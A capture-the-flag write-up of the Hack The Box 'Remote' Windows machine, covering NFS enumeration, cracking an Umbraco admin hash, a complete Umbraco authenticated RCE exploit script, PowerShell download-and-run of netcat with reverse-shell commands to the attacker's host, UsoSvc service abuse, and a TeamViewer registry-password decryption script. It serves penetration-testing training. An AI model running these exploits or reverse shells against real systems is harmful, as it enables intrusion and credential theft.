---
layout: walkthrough
title: Remote
description: HTB walkthrough
logo: /assets/img/walkthroughs/remote_logo.png
show-avatar: false
permalink: /walkthroughs/remote.html
OS: windows
difficulty: Easy
release: 21 Mar 2020
creator: <a href="https://www.hackthebox.eu/home/users/profile/2984">mrb3n</a>
cleared: 29 Jun 2020
published: 2020 06 29
---

**Cliffs:** mount nfs share containing backup of website running Umbraco CMS vulnerable to RCE, get creds from database file and exploit RCE for reverse shell as user. Two paths to root, UsoSvc service exploit, or teamviewer password vulnerability for creds to windRM login.

<h4 align="center">Enumeration</h4>

Starting with a standard nmap scan...

```
# Nmap 7.80 scan initiated Fri Jun 26 16:39:34 2020 as: nmap -sC -sV -p- -oN nmapscan.txt 10.10.10.180
Nmap scan report for 10.10.10.180
Host is up (0.089s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs    
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status  
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found                           
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found                           
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-26T20:44:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 26 16:44:12 2020 -- 1 IP address (1 host up) scanned in 278.43 seconds
```

There is a lot going on, but if we start with the web page and manually enumerate it by clicking all the links and seeing where they go, we will find some information on the contact page

![Umbraco Forms](/assets/img/walkthroughs/remote_umbracoforms.png)

This tells us that Umbraco is running, which is an open source CMS, as well as directs us to the login page when we click it. We don't find anything else of note, so lets move on to the nfs share we see running from the nmap scan. If we take a look at it with showmount

```
hilbert@kali:~/HTB/Machines/Remote$ showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

We can then mount it with the following command

```
sudo mount -t nfs 10.10.10.180:/site_backups /mnt/tmp
```

If we then browse the /mnt/tmp directory, we see what looks like the name suggests which is a backup of the running website.

If we look at the Web.config file in the base directory we can get the version of Umbraco that is running

![umbraco version](/assets/img/walkthroughs/remote_umbracoversion.png)

via google we see there is a remote code execution exploit for this version however it requires authentication. So let's dig a little deeper. 

If we look in the App_Data directory we will see an Umbraco.sdf file. This is a SQL Server Compact formated file, which should be the database that stores the login information. I couldn't get it to open in LINQPad as it appears to be corrupted (not sure if this was on my end or really is that way) but it doesn't matter because if we just view it from the command line checking for any strings we will find several password hashes

![umbraco_dbstring](/assets/img/walkthroughs/remote_dbstrings.png)

If we check the admin hash at <a img="https://crackstation.net">crackstation</a> we see it cracks to 'baconandcheese'

![remote_adminhtb](/assets/img/walkthroughs/remote_adminhtb.png)

So now that we have credentials we can use the RCE exploit found <a href="https://github.com/noraj/Umbraco-RCE">here</a>. 

```python
# Exploit Title: Umbraco CMS - Authenticated Remote Code Execution 
# Date: 2020-03-28
# Exploit Author: Alexandre ZANNI (noraj)
# Based on: https://www.exploit-db.com/exploits/46153
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases
# Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS
# Example: python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig

import requests
import re
import argparse

from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(prog='exploit.py',
    description='Umbraco authenticated RCE',
    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))
parser.add_argument('-u', '--user', metavar='USER', type=str,
    required=True, dest='user', help='username / email')
parser.add_argument('-p', '--password', metavar='PASS', type=str,
    required=True, dest='password', help='password')
parser.add_argument('-i', '--host', metavar='URL', type=str, required=True,
    dest='url', help='root URL')
parser.add_argument('-c', '--command', metavar='CMD', type=str, required=True,
    dest='command', help='command')
parser.add_argument('-a', '--arguments', metavar='ARGS', type=str, required=False,
    dest='arguments', help='arguments', default='')
args = parser.parse_args()

# Payload
payload = """\
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "%s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "%s"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>\
""" % (args.arguments, args.command)

login = args.user
password = args.password
host = args.url

# Process Login
url_login = host + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"
loginfo = { "username": login, "password": password}
s = requests.session()
r2 = s.post(url_login,json=loginfo)

# Go to vulnerable web page
url_xslt = host + "/umbraco/developer/Xslt/xsltVisualize.aspx"
r3 = s.get(url_xslt)

soup = BeautifulSoup(r3.text, 'html.parser')
VIEWSTATE = soup.find(id="__VIEWSTATE")['value']
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value']
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']
headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}
data = { "__EVENTTARGET": "", "__EVENTARGUMENT": "", "__VIEWSTATE": VIEWSTATE,
    "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,
    "ctl00$body$xsltSelection": payload,
    "ctl00$body$contentPicker$ContentIdValue": "",
    "ctl00$body$visualizeDo": "Visualize+XSLT" }

# Launch the attack
r4 = s.post(url_xslt, data=data, headers=headers)
# Filter output
soup = BeautifulSoup(r4.text, 'html.parser')
CMDOUTPUT = soup.find(id="result").getText()
print(CMDOUTPUT)
```

Since it is a windows machine, we will upload a netcat windows binary to use to get a reverse shell, by first starting a http server on our kali machine

```
sudo python3 -m http.server 80 --dir /usr/share/windows-resources/binaries/
```

and then run the exploit like so

```
python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "(new-object system.net.webclient).downloadfile('http://10.10.14.41/nc.exe','c:/users/public/nc.exe')"
```

followed by

```
python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c "c:/users/public/nc.exe" -a "10.10.14.41 1234 -e cmd.exe"
```

We pop a shell and have access to the user.txt

![user flag](/assets/img/walkthroughs/remote_usershell.png)

<h4 align="center">On To Root!</h4>

There are a couple paths to root. The easiest is 

<h5 align="left">Method 1:</h5>

Upload the powershell script *PowerUp.ps1* (using the same technique we uploaded netcat with) and running it with

```
powershell -exec bypass -command "& {import-module .\powerup.ps1; invoke-allchecks}"
```

![powerup](/assets/img/walkthroughs/remote_powerup.png)

We see the service permisions on UsoSvc are exploitable, and all we have to do is simply run the function it suggests using the same nc.exe we uploaded earlier to get a system shell

```
powershell -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-ServiceAbuse -ServiceName UsoSvc -Command 'c:\Users\Public\nc.exe 10.10.14.41 1234 -e cmd.exe'}"
```

![root1](/assets/img/walkthroughs/remote_root1.png)


<h5 align="left">Method 2:</h5>

If we enumerate the fille system we will see that TeamViewer7 is installed. Teamviewer is a remote desktop sharing application that stores it's passwords in the windows registry accessable to low privileged users and encrypted with a known key. There is a detailed writeup <a href="https://whynotsecurity.com/blog/teamviewer/">here</a> as well as a python script to decrypt the password once retrieved from the registery. We can view the registry entry with

```
reg query hklm\software\wow6432node\teamviewer\version7
```

![teamviewer registry](/assets/img/walkthroughs/remote_teamviewerregistry.png)

If we then run the python decryption script from the above site

```python
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
hex_str_cipher = "FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B"			# output from the registry

ciphertext = binascii.unhexlify(hex_str_cipher)
raw_un = AESCipher(key).decrypt(iv, ciphertext)
print(hexdump.hexdump(raw_un))
password = raw_un.decode('utf-16')
print(password)
```

![!R3m0t3!](/assets/img/walkthroughs/remote_teamviewpassword.png)

We have the password for TeamViewer. Thinking that maybe they use the same password for all the remote management tools, we attempt to use it to login as administrator to WinRm that is running on port 5985. Using the tool *evil-winrm* 

![evilwin](/assets/img/walkthroughs/remote_evilwinrm.png)

We are met with success and have gained access to the root.txt